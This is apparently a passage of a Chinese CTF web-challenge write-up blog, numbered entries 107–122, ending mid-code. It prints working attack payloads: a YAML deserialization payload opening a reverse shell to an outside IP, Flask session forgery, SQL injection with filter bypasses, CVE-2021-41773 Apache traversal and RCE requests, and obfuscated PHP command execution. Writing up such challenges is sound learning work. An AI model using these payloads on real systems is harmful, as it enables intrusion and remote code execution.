class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> re, random, uuid </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> yaml </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen </span><br><span class="line">app = Flask(__name__) random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">False</span> BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>] app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; Welcome to HDCTF2023 Read somethings</span></span><br><span class="line"><span class="string">Here is the challenge Upload file Enjoy it pwd </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(): </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>) </span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE) </span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE) </span><br><span class="line">        <span class="keyword">if</span> m: </span><br><span class="line">        	<span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> n: </span><br><span class="line">        	<span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span> </span><br><span class="line">    	res = urlopen(url) </span><br><span class="line">    	<span class="keyword">return</span> res.read() </span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">    	<span class="built_in">print</span>(<span class="built_in">str</span>(ex)) </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>): </span><br><span class="line">    <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST: </span><br><span class="line">        <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(): </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>: </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>) </span><br><span class="line">            <span class="keyword">return</span> redirect(request.url) </span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>] </span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span> </span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename): </span><br><span class="line">            filename = secure_filename(file.filename) </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>): </span><br><span class="line">                	os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>) </span><br><span class="line">                file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)) </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(): </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>: </span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>) </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile): </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span> </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f: </span><br><span class="line">            yaml.full_load(f) </span><br><span class="line">            f.close() </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span> </span><br><span class="line">     <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read() </span><br><span class="line">    app.run( debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span> ) </span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>在&#x2F;boogipop路由下是getflag的主要逻辑，session伪造+yaml反序列化，先需要知道secret_key，在&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，再用脚本解密，修改，再加密</p>
<p><code>02:42:ac:02:9e:d3</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac029ed3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s 137.52056192943886 -c <span class="string">&#x27;eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZO_r9w.mAjNdzv1Oe15iXPs7n6g0rSK02A&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;passport&#x27;</span>: <span class="string">&#x27;YamiYami&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#按照题目要求修改passport为Welcome To HDCTF2023</span></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s 137.52056192943886 -t <span class="string">&quot;&#123;&#x27;passport&#x27;:&#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span></span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZO_xQw.MOIAYyIci-lbAAe3YSHa_4WH-8s</span><br></pre></td></tr></table></figure>

<p>伪造session完成，接下来处理yaml反序列化，利用的是<code>yaml.full_load(f)</code>，exp：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.txt</span></span><br><span class="line"><span class="type">!!python/object/new:str</span></span><br><span class="line">    <span class="attr">args:</span> []</span><br><span class="line">    <span class="attr">state:</span> <span class="type">!!python/tuple</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.130.68.224/8888 &lt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="type">!!python/object/new:staticmethod</span></span><br><span class="line">        <span class="attr">args:</span> []</span><br><span class="line">        <span class="attr">state:</span></span><br><span class="line">          <span class="attr">update:</span> <span class="type">!!python/name:eval</span></span><br><span class="line">          <span class="attr">items:</span> <span class="type">!!python/name:list</span></span><br></pre></td></tr></table></figure>

<p>在<code>upload</code>处上传，修改session为伪造的值，开启端口监听。进行文件包含：<code>/boogipop?file=uploads/2.txt</code></p>
<p>反弹shell，<code>cat /tmp/flag_13_114514</code></p>
<h1 id="108-NCTF-2018-滴-晨跑打卡"><a href="#108-NCTF-2018-滴-晨跑打卡" class="headerlink" title="108.[NCTF 2018]滴!晨跑打卡"></a>108.[NCTF 2018]滴!晨跑打卡</h1><p>&#x2F;**&#x2F;被过滤使用%a0代替，#被过滤正常闭合处理</p>
<p>绕空格的一些常见方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/</span><br></pre></td></tr></table></figure>

<p>使用bp发包，请勿在浏览器操作</p>
<p><code>?id=1%27%a0union%a0select%a01,table_name,3,4%a0from%a0information_schema.tables%a0where%a0table_schema=%27database()%27%a0||%27</code></p>
<p>和原题不一样的是在这个地方会回显查询语句本身，通过回显可以看到表名是pcnumber</p>
<p><code>/?id=1%27%a0union%a0select%a01,column_name,3,4%a0from%a0information_schema.columns%a0where%a0table_name=%27pcnumber%27%a0||%27</code></p>
<p>最终payload：</p>
<p><code>?id=1%27%a0union%a0select%a01,(select%a0group_concat(flag)%a0from%a0pcnumber),3,4%27</code></p>
<h1 id="109-SWPUCTF-2022-新生赛-webdog1-start"><a href="#109-SWPUCTF-2022-新生赛-webdog1-start" class="headerlink" title="109.[SWPUCTF 2022 新生赛]webdog1__start"></a>109.[SWPUCTF 2022 新生赛]webdog1__start</h1><p>F12看到提示，简单的md5比较，传web&#x3D;<code>0e215962017</code></p>
<p>进入下一层，F12看到robots提示-&gt;f14g.php</p>
<p>响应包头<code>Hint:oh good job! but no flag ,come to F1l1l1l1l1lag.php</code></p>
<p>限制payload长度为18字符，较短的cat是\t，较短的{IFS}是\t，然后通配符*去模糊匹配flag</p>
<p><code>?get=system(&quot;nl\t/f*&quot;);</code></p>
<h1 id="110-GXYCTF-2019-BabySqli"><a href="#110-GXYCTF-2019-BabySqli" class="headerlink" title="110.[GXYCTF 2019]BabySqli"></a>110.[GXYCTF 2019]BabySqli</h1><p>F12有段b32-&gt;b64，得到</p>
<p><code>select * from user where username = &#39;$name&#39;</code></p>
<p>提交数据的post参数为<code>name&amp;pw</code></p>
<p>大小写绕过waf：<code>name=admin&#39;oRder by 4#&amp;pw=1</code></p>
<p>name&#x3D;admin时报错wrong pass</p>
<p>提交pw为数组时报错md5</p>
<p>payload：<code>name=admi&#39;union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></p>
<h1 id="111-NSSRound-4-SWPU-ez-rce"><a href="#111-NSSRound-4-SWPU-ez-rce" class="headerlink" title="111.[NSSRound#4 SWPU]ez_rce"></a>111.[NSSRound#4 SWPU]ez_rce</h1><p>CVE-2021-41773，Apache HTTP Server 2.4.49目录穿越漏洞，<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>默认开启，允许目录穿越，此外如果服务端开启了gi或者cgid这两个mod的情况下，利用该漏洞还将可以执行任意cg命令</p>
<p>poc：<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd</code></p>
<p>RCE：<code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh          A=|echo;cmd</code></p>
<h1 id="112-BJDCTF-2020-ZJCTF，不过如此"><a href="#112-BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="112.[BJDCTF 2020]ZJCTF，不过如此"></a>112.[BJDCTF 2020]ZJCTF，不过如此</h1><p>payload1：<code>/?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑就是执行<code>eval(&#39;strlower(&quot;\\1&quot;);&#39;)</code>，正则是e模式。存在漏洞：e模式下preg_replace可以让第二个参数当做代码执行；正则表达式模式两边添加<code>&#123;&#125;</code>会将相关匹配存储到一个临时缓冲区，从1开始排序，而<code>\\1</code>就正好会匹配到第一个变量，传入<code>\S*=$&#123;phpinfo()&#125;</code>正则就是<code>preg_replace(&#39;/(&#39;.\S*.&#39;)/ei&#39;,&#39;strlower(&quot;\\1&quot;)&#39;,phpinfo());</code>临时缓存区：<code>/S*==&gt;phpinfo();strlower(&quot;\\1&quot;)</code>匹配第一个，就执行了phpinfo()。</p>
<p>payload2：<code>?\S*=$&#123;phpinfo()&#125;</code></p>
<h1 id="113-鹏城杯-2022-简单的php"><a href="#113-鹏城杯-2022-简单的php" class="headerlink" title="113.[鹏城杯 2022]简单的php"></a>113.[鹏城杯 2022]简单的php</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;&#x27; === preg_replace(&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;, &#x27;&#x27;, $code)</span><br></pre></td></tr></table></figure>

<p><code>[^\s\(\)]+?</code> 表示<strong>不匹配</strong>所有空白符和<code>()</code> 一次或多次</p>
<p><code>\((?R)?\)</code> 表示循环匹配<code>()</code> 一次或0次，从这一点就需要使用二维数组绕过</p>
<p>无参函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#主要</span></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>()</span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()</span><br><span class="line"><span class="title function_ invoke__">session_id</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#配套</span></span><br><span class="line"><span class="title function_ invoke__">implode</span>() <span class="comment">//将一维数组转化为字符串</span></span><br><span class="line"><span class="title function_ invoke__">getchwd</span>() <span class="comment">//返回当前目录</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>() <span class="comment">//返回指定目录中文件和目录的数组</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>() <span class="comment">//返回路径中目录的部分</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>()   <span class="comment">//改变当前目录</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>()<span class="comment">//输出一个文件</span></span><br><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//返回数组当前单元，默认取第一个值</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>()     <span class="comment">//current()的别名</span></span><br><span class="line"><span class="title function_ invoke__">next</span>()    <span class="comment">//将函数内部指针指向数组中的下一个元素并输出</span></span><br><span class="line"><span class="title function_ invoke__">end</span>()     <span class="comment">//将内部指针指向数组中最后一个元素并输出</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>()<span class="comment">//函数返回数组中的随机键名，如果返回不止一个键名，则返回包含随机键名的数组</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>()<span class="comment">//用于反转/交换数组中所有键名和关联的键值</span></span><br><span class="line"><span class="title function_ invoke__">array_slice</span>()<span class="comment">//在数组中根据条件读取出一段值并返回</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()<span class="comment">//返回反转顺序的数组</span></span><br><span class="line"><span class="title function_ invoke__">chr</span>()      <span class="comment">//ascii转字符</span></span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>()  <span class="comment">//16进制转二进制串</span></span><br><span class="line"><span class="title function_ invoke__">getenv</span>()   <span class="comment">//获取环境变量，7.1后可以</span></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>()<span class="comment">//返回一个包含本地数字及货币格式信息的数组</span></span><br></pre></td></tr></table></figure>

<p>二维数组拼接注意的点：必须用<code>[!%FF]</code>进行分割</p>
<p>payload：<code>system(end(getallheaders()));-&gt;(~%8C%86%8C%8B%9A%92)[!%FF]((~%9A%91%9B)[!%FF]((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)[!%FF]()));</code></p>
<p>数据包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28147</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: BD_UPN=12314753</span><br><span class="line">Connection: cat /nssctfflag</span><br></pre></td></tr></table></figure>

<h1 id="114-HGAME-2023-week1-Classic-Childhood-Game"><a href="#114-HGAME-2023-week1-Classic-Childhood-Game" class="headerlink" title="114.[HGAME 2023 week1]Classic Childhood Game"></a>114.[HGAME 2023 week1]Classic Childhood Game</h1><p>F12</p>
<p><code>Event.js -&gt; function mota -&gt; var a =[&#39;\x59...&#39;]</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#YUdkaGJXVjdabFZ1Ym5sS1lYWmhjMk55YVhCMEprWjFibTU1VFRCMFlVYzBiV1Y5</span></span><br><span class="line"><span class="comment">#base64 decode -&gt; aGdhbWV7ZlVubnlKYXZhc2NyaXB0JkZ1bm55TTB0YUc0bWV9</span></span><br><span class="line"><span class="comment">#base64 decode -&gt; hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="115-NISACTF-2022-hardsql"><a href="#115-NISACTF-2022-hardsql" class="headerlink" title="115.[NISACTF 2022]hardsql"></a>115.[NISACTF 2022]hardsql</h1><p>Quine注入，详见75题，此处waf禁用了char，可使用chr和0x替换</p>
<p>char(34)&#x3D;chr(34)-&gt;0x22</p>
<p>char(39)&#x3D;chr(39)-&gt;0x27</p>
<h1 id="116-安洵杯-2020-Normal-SSTI"><a href="#116-安洵杯-2020-Normal-SSTI" class="headerlink" title="116.[安洵杯 2020]Normal SSTI"></a>116.[安洵杯 2020]Normal SSTI</h1><p>fenjing一把梭</p>
<h1 id="117-MoeCTF-2022-ezhtml"><a href="#117-MoeCTF-2022-ezhtml" class="headerlink" title="117.[MoeCTF 2022]ezhtml"></a>117.[MoeCTF 2022]ezhtml</h1><p>F12 evil.js</p>
<h1 id="118-SWPUCTF-2022-新生赛-funny-php"><a href="#118-SWPUCTF-2022-新生赛-funny-php" class="headerlink" title="118.[SWPUCTF 2022 新生赛]funny_php"></a>118.[SWPUCTF 2022 新生赛]funny_php</h1><p>使用数组绕过strlen，双写绕过正则置空，强碰撞字符串</p>
<p>payload:<code>GET传?num[]=1&amp;str=NSNSSCTFSCTF POST传 md5_1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;md5_2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p>
<h1 id="119-HNCTF-2022-WEEK2-ez-ssrf"><a href="#119-HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="119.[HNCTF 2022 WEEK2]ez_ssrf"></a>119.[HNCTF 2022 WEEK2]ez_ssrf</h1><p>ssrf，但是遇到个很想不明白的点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>b64结果是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogQ2xvc2UKCg==</span><br></pre></td></tr></table></figure>

<p>打过去是400，正确的结果应该是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=</span><br></pre></td></tr></table></figure>

<p>解出来是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而拿上面的复制进行b64</p>
<p>又得到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogQ2xvc2UKCgo=</span><br></pre></td></tr></table></figure>

<p>是真的离谱</p>
<h1 id="120-MoeCTF-2021-Web安全入门指北—小饼干"><a href="#120-MoeCTF-2021-Web安全入门指北—小饼干" class="headerlink" title="120.[MoeCTF 2021]Web安全入门指北—小饼干"></a>120.[MoeCTF 2021]Web安全入门指北—小饼干</h1><p>cookie的VIP改成1即可</p>
<h1 id="121-MoeCTF-2022-what-are-y0u-uploading？"><a href="#121-MoeCTF-2022-what-are-y0u-uploading？" class="headerlink" title="121.[MoeCTF 2022]what are y0u uploading？"></a>121.[MoeCTF 2022]what are y0u uploading？</h1><p>随便传个马抓包改文件名为f1ag.php直接返回flag</p>
<h1 id="122-MoeCTF-2021-2048"><a href="#122-MoeCTF-2021-2048" class="headerlink" title="122.[MoeCTF 2021]2048"></a>122.[MoeCTF 2021]2048</h1><p>f12看到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getFlag</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span><br><span class="line">  req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;flag.php?score=&quot;</span>+obj.<span class="property">score</span>,<span class="literal">true</span>);</span><br><span class="line">  req.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">      